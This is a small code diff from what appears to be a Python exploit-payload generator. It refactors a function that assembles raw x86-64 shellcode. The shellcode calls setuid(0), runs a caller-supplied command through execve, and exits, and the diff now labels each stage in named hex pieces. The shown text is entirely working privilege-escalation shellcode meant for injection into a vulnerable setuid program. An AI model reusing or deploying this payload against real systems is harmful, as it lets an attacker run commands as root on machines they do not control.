@@ -63,10 +63,15 @@ def make_python_payload():
 
 
 def make_setuid_code(command: str) -> bytes:
-    program = decode("31c031ffb0690f05488d3d0f00000031f66a3b58990f0531ff6a3c580f05")
-    cmd = command.encode("ascii")
-    pad = decode("000000")
-    return program + cmd + pad
+
+    stuid = decode("31c031ffb0690f05")
+    # addr is rip+0xf
+    execv = decode("488d3d0f00000031f66a3b58990f05")
+    exit_call = decode("31ff6a3c580f05")
+
+    target = command.encode("ascii")
+    null = decode("000000")
+    return stuid + execv + exit_call + target + null
 
 def make_crash_code() -> bytes:
     # amd
